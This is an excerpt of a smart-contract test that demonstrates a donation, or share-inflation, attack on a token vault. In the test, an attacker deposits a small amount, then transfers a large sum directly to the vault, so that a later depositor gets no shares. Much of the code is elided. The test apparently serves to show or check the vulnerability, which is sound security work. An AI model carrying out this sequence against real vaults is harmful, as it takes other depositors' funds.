...
describe("VaultDonationAttack", function () {
  ...
  describe("Deposit from two users", function () {
    it("Both Bob will do inflaction attack", async function () {
      ...
      // Bob
      await oceanToken.transfer(bob, 100);
      await oceanToken.connect(bob).approve(vault, 100);
      await vault.connect(bob).deposit(100, bob);
      //donation
      await oceanToken.transfer(vault, 10000);
      ...
      // Alice did not receive any share due to donation attack
